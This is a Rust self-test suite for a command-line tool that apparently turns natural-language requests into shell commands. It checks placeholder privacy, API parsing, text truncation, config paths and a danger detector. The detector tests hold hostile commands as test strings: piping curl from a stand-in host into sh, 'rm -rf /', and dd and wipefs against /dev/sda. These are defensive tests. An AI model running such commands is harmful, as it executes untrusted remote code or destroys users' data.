use crate::cache::cache_key;
use crate::config::{ApiStyle, MAX_RETRIES, Reasoning};
use crate::context::{apply_placeholders, collect_placeholders, gather_context, get_shell, Placeholders};
use crate::danger::is_dangerous;
use crate::llm::{Message, RETRY_HINT};
use crate::protocol::{parse_check, parse_explore};
use crate::style_label;
use crate::ui::{is_bare_cd, parse_candidates, truncate};

// ── Built-in self-test suite (`--test`) ─────────────────────────────────────

pub fn run_tests() {
    println!("Running comma self-tests...\n");
    let mut pass = 0;
    let mut fail = 0;

    let ph = collect_placeholders();
    let ctx = gather_context();

    // Helper
    let mut check = |name: &str, ok: bool| {
        if ok {
            println!("  ✓ {}", name);
            pass += 1;
        } else {
            println!("  ✗ {}", name);
            fail += 1;
        }
    };

    // Test 1: gather_context does NOT contain real username
    check(
        "context does not leak username",
        !ctx.contains(&ph.user),
    );

    // Test 2: gather_context does NOT contain real hostname
    check(
        "context does not leak hostname",
        !ctx.contains(&ph.hostname),
    );

    // Test 3: gather_context does NOT contain real home path
    check(
        "context does not leak home path",
        !ctx.contains(&ph.home),
    );

    // Test 4: apply_placeholders replaces {{USER}}
    let input = "cd /home/{{USER}}/docs";
    let output = apply_placeholders(input, &ph);
    let expected = format!("cd /home/{}/docs", ph.user);
    check(
        &format!("{{USER}} → {} ", ph.user),
        output == expected,
    );

    // Test 5: apply_placeholders replaces {{HOSTNAME}}
    let input = "ssh {{HOSTNAME}}";
    let output = apply_placeholders(input, &ph);
    let expected = format!("ssh {}", ph.hostname);
    check(
        &format!("{{HOSTNAME}} → {} ", ph.hostname),
        output == expected,
    );

    // Test 6: apply_placeholders replaces {{HOME}}
    let input = "ls {{HOME}}/projects";
    let output = apply_placeholders(input, &ph);
    let expected = format!("ls {}/projects", ph.home);
    check(
        &format!("{{HOME}} → {} ", ph.home),
        output == expected,
    );

    // Test 7: multiple placeholders in one string
    let input = "scp {{USER}}@{{HOSTNAME}}:{{HOME}}/file .";
    let output = apply_placeholders(input, &ph);
    let expected = format!("scp {}@{}:{}/file .", ph.user, ph.hostname, ph.home);
    check("multiple placeholders in one string", output == expected);

    // Test 8: no placeholders → unchanged
    let input = "ls -la";
    let output = apply_placeholders(input, &ph);
    check("no placeholders → unchanged", output == input);

    // Test 9: context contains non-private info
    check("context contains distro", ctx.contains("Distro:"));
    check("context contains kernel", ctx.contains("Kernel:"));
    check("context contains arch", ctx.contains("Arch:"));
    check("context contains shell", ctx.contains("Shell:"));
    // get_shell always falls back to /bin/sh (Unix) or cmd.exe (Windows)
    let shell_line = ctx.lines().find(|l| l.starts_with("Shell: ")).unwrap_or("Shell: ");
    check("shell value is non-empty", shell_line.len() > "Shell: ".len());
    check("context contains CWD", ctx.contains("CWD:"));
    check("context contains packages", ctx.contains("Installed packages"));
    // Standalone executables in user-local dirs (e.g. ~/.kimi-code/bin/kimi)
    check("context contains user binaries", ctx.contains("User binaries"));

    // Test 10: retry constants are sane
    check("MAX_RETRIES >= 2", MAX_RETRIES >= 2);
    check("MAX_RETRIES <= 5", MAX_RETRIES <= 5);
    check("RETRY_HINT is non-empty", !RETRY_HINT.is_empty());

    // Test 10b: API style parsing, URL auto-detection and labels
    check("api_style: openai", ApiStyle::from_str("openai") == Some(ApiStyle::OpenAI));
    check(
        "api_style: responses",
        ApiStyle::from_str("responses") == Some(ApiStyle::OpenAIResponses),
    );
    check(
        "api_style: openai-responses alias",
        ApiStyle::from_str("openai-responses") == Some(ApiStyle::OpenAIResponses),
    );
    check("api_style: anthropic", ApiStyle::from_str("claude") == Some(ApiStyle::Anthropic));
    check("api_style: unknown", ApiStyle::from_str("gemini").is_none());
    check(
        "api_style from_url: anthropic",
        ApiStyle::from_url("https://api.anthropic.com") == ApiStyle::Anthropic,
    );
    check(
        "api_style from_url: responses",
        ApiStyle::from_url("https://api.openai.com/v1/responses") == ApiStyle::OpenAIResponses,
    );
    check(
        "api_style from_url: default openai",
        ApiStyle::from_url("https://api.cerebras.ai/v1") == ApiStyle::OpenAI,
    );
    check("style_label: responses", style_label(ApiStyle::OpenAIResponses) == "responses");

    // Test 11: #EXPLORE: prefix detection
    check("parse_explore: basic", parse_explore("#EXPLORE: openclaw --help") == Some("openclaw --help"));
    check("parse_explore: with spaces", parse_explore("  #EXPLORE: man ffmpeg  ") == Some("man ffmpeg"));
    check("parse_explore: no prefix", parse_explore("ls -la").is_none());
    check("parse_explore: partial prefix", parse_explore("#EXPLOR ls").is_none());
    check("parse_explore: just prefix", parse_explore("#EXPLORE:").is_none());

    // Test 12: #CHECK: prefix detection
    check("parse_check: basic", parse_check("#CHECK: ripgrep fd bat") == Some(vec!["ripgrep", "fd", "bat"]));
    check("parse_check: single", parse_check("#CHECK: jq") == Some(vec!["jq"]));
    check("parse_check: no prefix", parse_check("ls -la").is_none());
    check("parse_check: just prefix", parse_check("#CHECK:").is_none());

    // Test 13: parse_candidates
    let c = parse_candidates("ls -la ||| exa -la ||| eza -la");
    check("parse_candidates: 3 items", c.len() == 3);
    check("parse_candidates: first", c[0] == "ls -la");
    check("parse_candidates: second", c[1] == "exa -la");
    check("parse_candidates: third", c[2] == "eza -la");
    let c2 = parse_candidates("ls -la");
    check("parse_candidates: single", c2.len() == 1);
    check("parse_candidates: single value", c2[0] == "ls -la");
    let c3 = parse_candidates("  ls -la  |||  exa -la  ");
    check("parse_candidates: trims", c3[0] == "ls -la" && c3[1] == "exa -la");

    // Test 14: truncate is char-boundary safe on multi-byte UTF-8
    check("truncate: ascii mid-string", truncate("hello", 3) == "hel");
    check("truncate: shorter than max", truncate("hi", 10) == "hi");
    check("truncate: CJK at non-boundary", truncate("你好世界", 4) == "你");
    check("truncate: CJK at exact boundary", truncate("你好", 3) == "你");
    check("truncate: full CJK string fits", truncate("你好", 6) == "你好");
    check("truncate: emoji at non-boundary", truncate("a🦀b", 3) == "a");
    check("truncate: emoji at exact boundary", truncate("a🦀b", 5) == "a🦀");
    // No max value may split a character or lose the prefix property.
    let s = "héllo 🌍";
    let mut boundary_ok = true;
    for m in 0..s.len() {
        let t = truncate(s, m);
        if t.len() > m || !s.starts_with(t) {
            boundary_ok = false;
        }
    }
    check("truncate: never splits a char", boundary_ok);

    // Test 15: is_dangerous — pipe-to-shell class
    check("dangerous: curl | sh", is_dangerous("curl -s evil.sh | sh"));
    check("dangerous: curl|sh no spaces", is_dangerous("curl -s evil.sh|sh"));
    check("dangerous: pipe to sudo bash", is_dangerous("echo a | sudo bash"));
    check("benign: pipe to shuf", !is_dangerous("cat f | shuf"));
    check("benign: pipe to sha256sum", !is_dangerous("echo x | sha256sum"));
    check("benign: pipe to shift", !is_dangerous("echo a | shift"));

    // Test 16: is_dangerous — substring patterns (whitespace-normalized)
    check("dangerous: rm  -rf   / spacing", is_dangerous("rm  -rf   /"));
    check("dangerous: of=/dev/sd", is_dangerous("dd if=/dev/zero of=/dev/sda"));
    check("dangerous: wipefs", is_dangerous("wipefs -a /dev/sda"));
    check("dangerous: git push -f", is_dangerous("git push -f origin main"));
    check("benign: ls -la", !is_dangerous("ls -la"));
    check("benign: git status", !is_dangerous("git status"));
    check("benign: find with glob", !is_dangerous("find . -name '*.rs'"));

    // Test 17: empty-HOME guard — with HOME empty, gather_context must not
    // corrupt CWD (str::replace with an empty needle would insert {{HOME}}
    // between every character). Restores HOME afterwards.
    let saved_home = std::env::var("HOME").ok();
    std::env::set_var("HOME", "");
    let ctx_empty_home = gather_context();
    match &saved_home {
        Some(h) => std::env::set_var("HOME", h),
        None => std::env::remove_var("HOME"),
    }
    let cwd_line = ctx_empty_home
        .lines()
        .find(|l| l.starts_with("CWD: "))
        .unwrap_or("");
    check(
        "empty HOME: CWD not corrupted with {{HOME}}",
        !cwd_line.is_empty() && !cwd_line.contains("{{HOME}}"),
    );

    // Test 18: apply_placeholders with an empty home value still substitutes
    // cleanly (empty needle never reaches str::replace).
    let ph_empty = Placeholders {
        user: "u".into(),
        hostname: "h".into(),
        home: String::new(),
    };
    check(
        "apply_placeholders: empty home value",
        apply_placeholders("ls {{HOME}}", &ph_empty) == "ls ",
    );

    // Test 19: cache_key is per-model — the cache-first pass across the
    // fallback chain relies on distinct keys per model for identical messages.
    let msgs = [Message { role: "user".into(), content: "list files".into() }];
    let key_a = cache_key("model-a", "sys", &msgs);
    check(
        "cache_key: differs per model",
        cache_key("model-b", "sys", &msgs) != key_a,
    );
    check(
        "cache_key: stable for identical input",
        cache_key("model-a", "sys", &msgs) == key_a,
    );

    // Test 20: COMMA_EVAL_FILE eval mode — execute() appends the
    // comment-stripped command (one line) to the file instead of spawning
    // a shell (no spawn can happen in this mode by construction).
    let eval_path = std::env::temp_dir().join(format!("comma-eval-test-{}", std::process::id()));
    let _ = std::fs::remove_file(&eval_path);
    std::env::set_var("COMMA_EVAL_FILE", &eval_path);
    crate::execute("cd /tmp # comment");
    std::env::remove_var("COMMA_EVAL_FILE");
    let eval_content = std::fs::read_to_string(&eval_path).unwrap_or_default();
    let _ = std::fs::remove_file(&eval_path);
    check(
        "eval file: comment-stripped command appended",
        eval_content == "cd /tmp\n",
    );

    // Test 21: is_bare_cd — first token of the comment-stripped command
    check("is_bare_cd: bare cd", is_bare_cd("cd"));
    check("is_bare_cd: cd with args", is_bare_cd("cd /d %USERPROFILE%"));
    check("is_bare_cd: leading spaces", is_bare_cd("   cd /tmp"));
    check("is_bare_cd: with comment", is_bare_cd("cd /tmp # go home"));
    check("is_bare_cd: cd.. is not bare cd", !is_bare_cd("cd.."));
    check("is_bare_cd: echo cd is not bare cd", !is_bare_cd("echo cd"));

    // Test 22: COMMA_EVAL_SHELL overrides the reported shell dialect (the
    // eval wrapper sets it so generation matches the shell that evals);
    // an empty value falls through. Saved/restored around the checks.
    let saved_eval_shell = std::env::var("COMMA_EVAL_SHELL").ok();
    std::env::set_var("COMMA_EVAL_SHELL", "powershell");
    check("get_shell: COMMA_EVAL_SHELL wins", get_shell() == "powershell");
    std::env::set_var("COMMA_EVAL_SHELL", "");
    let with_empty = get_shell();
    std::env::remove_var("COMMA_EVAL_SHELL");
    let without = get_shell();
    check(
        "get_shell: empty COMMA_EVAL_SHELL ignored",
        with_empty == without && !without.is_empty(),
    );
    match &saved_eval_shell {
        Some(v) => std::env::set_var("COMMA_EVAL_SHELL", v),
        None => std::env::remove_var("COMMA_EVAL_SHELL"),
    }

    // Test 23: every embedded locale substitutes named placeholders.
    // rust-i18n v3 only replaces %{name} — a `{}` placeholder would show up
    // literally, so a successful substitution also proves the locale file
    // uses the right syntax for these keys.
    for locale in rust_i18n::available_locales!() {
        let running = t!("info.running", locale => locale, "cmd" => "MARKER_CMD");
        check(
            &format!("locale {}: running substitutes %{{cmd}}", locale),
            running.contains("MARKER_CMD"),
        );
        let exit = t!("error.exit_code", locale => locale, "code" => 42);
        check(
            &format!("locale {}: exit_code substitutes %{{code}}", locale),
            exit.contains("42"),
        );
        let mismatch = t!(
            "update.checksum_mismatch",
            locale => locale,
            "name" => "N", "expected" => "E", "actual" => "A"
        );
        check(
            &format!("locale {}: checksum_mismatch substitutes all", locale),
            mismatch.contains('N') && mismatch.contains('E') && mismatch.contains('A'),
        );
    }

    // Test 24: config_path — XDG location preferred on Unix, legacy
    // ~/.local/bin/,.config.json kept as fallback for existing installs.
    // Uses a fake HOME in a temp dir; XDG_CONFIG_HOME is saved/restored.
    // Skipped on Windows, where the platform default is %APPDATA%\comma.
    if !cfg!(windows) {
        use crate::config::config_path;
        let fake = std::env::temp_dir().join(format!("comma-test-home-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&fake);
        let home = fake.to_string_lossy().to_string();
        let xdg = fake.join(".config/comma/config.json");
        let legacy = fake.join(".local/bin/,.config.json");
        let saved_xdg = std::env::var("XDG_CONFIG_HOME").ok();
        std::env::remove_var("XDG_CONFIG_HOME");

        // Neither exists → XDG path (where new installs write the template)
        check("config_path: defaults to XDG", config_path(&home) == xdg);
        check(
            "prompt_path: defaults to XDG",
            crate::prompt::prompt_path(&home) == fake.join(".config/comma/prompt.md"),
        );

        // Only legacy exists → legacy wins (existing install)
        std::fs::create_dir_all(legacy.parent().unwrap()).unwrap();
        std::fs::write(&legacy, "{}").unwrap();
        check("config_path: legacy fallback", config_path(&home) == legacy);
        std::fs::write(fake.join(".local/bin/,.prompt.md"), "x").unwrap();
        check(
            "prompt_path: legacy fallback",
            crate::prompt::prompt_path(&home) == fake.join(".local/bin/,.prompt.md"),
        );

        // Both exist → XDG wins
        std::fs::create_dir_all(xdg.parent().unwrap()).unwrap();
        std::fs::write(&xdg, "{}").unwrap();
        check("config_path: XDG preferred", config_path(&home) == xdg);

        // Cache: defaults to ~/.cache/comma/cache.json, legacy fallback works
        use crate::config::cache_path;
        let cache_xdg = fake.join(".cache/comma/cache.json");
        std::fs::remove_file(&xdg).unwrap();
        check("cache_path: defaults to XDG cache", cache_path(&home) == cache_xdg);
        std::fs::write(fake.join(".local/bin/,.cache.json"), "{}").unwrap();
        check(
            "cache_path: legacy fallback",
            cache_path(&home) == fake.join(".local/bin/,.cache.json"),
        );

        // Portable install: a file next to the executable beats ~/.local/bin
        let exe_cfg = crate::config::exe_dir(&home).join(",.config.json");
        std::fs::write(&exe_cfg, "{}").unwrap();
        check("config_path: executable-adjacent (portable)", config_path(&home) == exe_cfg);
        let _ = std::fs::remove_file(&exe_cfg);

        // XDG_CONFIG_HOME honored
        let custom = fake.join("custom-xdg");
        std::env::set_var("XDG_CONFIG_HOME", &custom);
        std::fs::create_dir_all(custom.join("comma")).unwrap();
        std::fs::write(custom.join("comma/config.json"), "{}").unwrap();
        check(
            "config_path: XDG_CONFIG_HOME honored",
            config_path(&home) == custom.join("comma/config.json"),
        );

        match &saved_xdg {
            Some(v) => std::env::set_var("XDG_CONFIG_HOME", v),
            None => std::env::remove_var("XDG_CONFIG_HOME"),
        }
        let _ = std::fs::remove_dir_all(&fake);
    }

    // ── Reasoning enum ──────────────────────────────────────────────────────

    // Tokens(0) defaults
    let r = Reasoning::Tokens(0);
    check("reasoning tokens(0) budget_tokens", r.budget_tokens() == 0);
    check("reasoning tokens(0) effort_str", r.effort_str() == "none");

    // Tokens mapping to effort
    let r = Reasoning::Tokens(512);
    check("reasoning tokens(512) effort", r.effort_str() == "low");
    let r = Reasoning::Tokens(1024);
    check("reasoning tokens(1024) effort", r.effort_str() == "low");
    let r = Reasoning::Tokens(2048);
    check("reasoning tokens(2048) effort", r.effort_str() == "low");
    let r = Reasoning::Tokens(4096);
    check("reasoning tokens(4096) effort", r.effort_str() == "low");
    let r = Reasoning::Tokens(8192);
    check("reasoning tokens(8192) effort", r.effort_str() == "medium");
    let r = Reasoning::Tokens(16384);
    check("reasoning tokens(16384) effort", r.effort_str() == "medium");
    let r = Reasoning::Tokens(32768);
    check("reasoning tokens(32768) effort", r.effort_str() == "high");

    // Effort mapping to budget_tokens
    let r = Reasoning::Effort("none".into());
    check("reasoning effort(none) budget", r.budget_tokens() == 0);
    let r = Reasoning::Effort("low".into());
    check("reasoning effort(low) budget", r.budget_tokens() == 1024);
    let r = Reasoning::Effort("medium".into());
    check("reasoning effort(medium) budget", r.budget_tokens() == 2048);
    let r = Reasoning::Effort("high".into());
    check("reasoning effort(high) budget", r.budget_tokens() == 4096);
    let r = Reasoning::Effort("unknown".into());
    check("reasoning effort(unknown) budget", r.budget_tokens() == 0);

    // Effort passthrough
    let r = Reasoning::Effort("low".into());
    check("reasoning effort(low) passthrough", r.effort_str() == "low");
    let r = Reasoning::Effort("custom".into());
    check("reasoning effort(custom) passthrough", r.effort_str() == "custom");

    // Default reasoning is Tokens(0) = disabled
    let r = Reasoning::default();
    check("reasoning default is disabled", r.budget_tokens() == 0);
    check("reasoning default effort is none", r.effort_str() == "none");

    // Summary
    println!("\n{} passed, {} failed", pass, fail);
    if fail > 0 {
        std::process::exit(1);
    }
}
